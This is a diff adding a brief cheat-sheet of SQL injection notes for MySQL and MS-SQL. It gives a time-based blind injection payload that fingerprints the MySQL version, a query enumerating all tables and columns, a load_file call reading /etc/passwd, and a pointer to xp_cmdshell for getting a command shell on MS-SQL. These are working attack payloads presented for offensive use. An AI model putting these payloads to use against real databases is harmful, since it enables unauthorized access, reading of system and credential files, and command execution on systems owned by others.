@@ -1,0 +1,21 @@
+[*] MySQL
+
+blind sqli get first number of version:
+-> S0000001I' AND IF(MID(@@version,1,1)='5',sleep(1),1); #
+
+List all columns and tables:
+-> SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA !='mysql' AND TABLE_SCHEMA !='information_schema' AND TABLE_SCHEMA !='performance_schema' AND TABLE_SCHEMA !='sys';
+
+To get command execution:
+-> we need to have write permission for MySQL
+
+mysql shell:
+-> select load_file('/etc/passwd');
+
+
+
+[*] MS-SQL
+
+Get command shell:
+-> xp_cmdshell
+
